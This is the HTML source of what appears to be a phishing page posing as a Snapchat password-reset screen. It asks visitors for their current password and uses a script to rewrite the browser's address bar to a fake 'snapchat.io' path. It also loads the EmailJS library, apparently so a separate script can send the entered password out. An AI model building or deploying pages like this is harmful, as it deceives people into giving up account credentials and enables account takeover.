<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Snapchat • Password Reset</title>
  <link rel="stylesheet" href="style.css">
  <link rel="icon" href="snap.ico" type="image/x-icon">
  
  <script>
    document.addEventListener("DOMContentLoaded", function() {
      const newURL = "snapchat.io/password_reset"; // Change this to your desired URL path
      history.replaceState(null, "", newURL);
    });
  </script>
</head>
<body>
  
  <div class="container">
    <img src="snaplogo2.png" alt="Snap Logo" class="logo">
    <h1>Reset Password</h1>
    <p class="warning-text">Enter your current password.</p>
    <form id="emailForm">
      <input type="text" id="textBox" placeholder="Your Current Password" required>
      <button type="submit">Submit</button>
    </form>
    <p id="statusMessage"></p>
  </div>

  <footer class="footer">
    <p>Snap Inc, 2023-2024©</p>
    <p>Santa Monica, CA</p>
  </footer>

  <!-- Load the EmailJS library -->
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <!-- Link to the custom script -->
  <script src="script.js"></script>
</body>
</html>
